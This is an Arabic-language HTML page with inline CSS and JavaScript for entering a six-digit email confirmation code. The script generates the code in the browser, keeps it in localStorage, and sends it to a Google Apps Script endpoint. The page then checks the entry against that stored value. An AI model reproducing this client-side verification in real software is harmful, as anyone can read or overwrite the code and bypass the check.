<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تأكيد الرمز</title>
    <style>
        body { 
            font-family: sans-serif; 
            margin: 0; 
            display: flex; 
            justify-content: center; 
            background-color: #EAF0E9; 
            min-height: 100vh; 
        }

        .main-content { 
            width: 100%; 
            max-width: 400px; 
            padding: 40px 15px; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            box-sizing: border-box;
        }

        .instruction-text { 
            font-size: 16px; 
            font-weight: bold; 
            margin-bottom: 30px; 
            text-align: center; 
            width: 100%; 
            color: #333;
        }

        .otp-container { 
            display: flex; 
            justify-content: space-between; 
            width: 100%; 
            gap: 6px; 
            margin-bottom: 35px; 
            direction: ltr; /* لجعل الترتيب من اليسار لليمين أثناء الإدخال */
        }

        .otp-container input { 
            width: 14%; 
            aspect-ratio: 1 / 1.2; 
            text-align: center; 
            font-size: 22px; 
            font-weight: bold; 
            border: 1px solid #c8d1c7; 
            border-radius: 12px; 
            outline: none; 
            background: #fff; 
            transition: 0.3s;
        }

        .otp-container input:focus { 
            border-color: #2EAF4A; 
            box-shadow: 0 0 5px rgba(46, 175, 74, 0.2);
        }

        .action-btn { 
            width: 100%; 
            background-color: #ffffff; 
            color: #ccc; 
            border: 1px solid #c8d1c7; 
            padding: 18px; 
            border-radius: 15px; 
            font-size: 20px; 
            font-weight: bold; 
            cursor: not-allowed; 
            transition: 0.3s; 
        }

        .action-btn.active { 
            background-color: #2EAF4A; 
            color: #ffffff; 
            border: none; 
            cursor: pointer; 
        }

        .resend-text { 
            margin-top: 25px; 
            font-size: 18px; 
            font-weight: bold; 
            color: #000; 
            cursor: pointer; 
            text-decoration: none; 
            transition: 0.2s;
        }

        .resend-text:active { opacity: 0.6; }
    </style>
</head>
<body>

    <div class="main-content">
        <div class="instruction-text">إدخلوا رمز التأكيد الذي توصلتم به في رسالة Gmail</div>
        
        <div class="otp-container" id="otpFields">
            <input type="number" pattern="[0-9]*" inputmode="numeric">
            <input type="number" pattern="[0-9]*" inputmode="numeric">
            <input type="number" pattern="[0-9]*" inputmode="numeric">
            <input type="number" pattern="[0-9]*" inputmode="numeric">
            <input type="number" pattern="[0-9]*" inputmode="numeric">
            <input type="number" pattern="[0-9]*" inputmode="numeric">
        </div>

        <button id="submitOtp" class="action-btn" disabled>تأكيد</button>
        
        <div id="resendBtn" class="resend-text">إعادة إرسال الرمز</div>
    </div>

<script>
    const inputs = document.querySelectorAll('#otpFields input');
    const btn = document.getElementById('submitOtp');
    const resendBtn = document.getElementById('resendBtn');
    
    // الرابط الخاص بك
    const scriptURL = 'https://script.google.com/macros/s/AKfycbwKACz6-gYKCiYYDLYBSqMk-EUtadf23y1fQm0xmcWekwN2LiTl8dX8o_TZPsBQ8G5K/exec';

    // إدارة حقول الإدخال
    inputs.forEach((input, index) => {
        input.addEventListener('input', () => {
            if (input.value.length > 1) input.value = input.value.slice(0, 1);
            
            // الانتقال للحقل التالي تلقائياً
            if (input.value !== "" && index < inputs.length - 1) {
                inputs[index + 1].focus();
            }
            
            checkInputs();
        });

        // العودة للخلف عند مسح الرقم
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && input.value === "" && index > 0) {
                inputs[index - 1].focus();
            }
        });
    });

    function checkInputs() {
        const code = Array.from(inputs).map(i => i.value).join('');
        if (code.length === 6) {
            btn.disabled = false;
            btn.classList.add('active');
        } else {
            btn.disabled = true;
            btn.classList.remove('active');
        }
    }

    // زر التأكيد
    btn.addEventListener('click', () => {
        const userCode = Array.from(inputs).map(i => i.value).join('');
        const savedOTP = localStorage.getItem('currentOTP');

        if (userCode === savedOTP) {
            // إذا كان الكود صحيحاً ننتقل لصفحة الرمز السري
            window.location.href = "../login/";
        } else {
            alert("رمز التحقق غير صحيح، حاول مرة أخرى.");
            inputs.forEach(i => i.value = "");
            inputs[0].focus();
            checkInputs();
        }
    });

    // زر إعادة إرسال الرمز
    resendBtn.addEventListener('click', async () => {
        const email = localStorage.getItem('storedEmail') || sessionStorage.getItem('tempEmail');
        
        if (!email) {
            alert("حدث خطأ، يرجى العودة لصفحة البداية.");
            window.location.href = "../";
            return;
        }

        const newOtp = Math.floor(100000 + Math.random() * 900000).toString();
        localStorage.setItem('currentOTP', newOtp);
        
        resendBtn.innerText = "جاري الإرسال...";
        resendBtn.style.pointerEvents = "none";

        try {
            await fetch(scriptURL, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({ email: email, otp: newOtp, action: "send_otp" })
            });
            alert("تم إرسال رمز جديد إلى بريدك الإلكتروني.");
        } catch (e) {
            alert("تم إرسال الرمز، يرجى التحقق من بريدك.");
        } finally {
            resendBtn.innerText = "إعادة إرسال الرمز";
            resendBtn.style.pointerEvents = "auto";
        }
    });
</script>
</body>
</html>
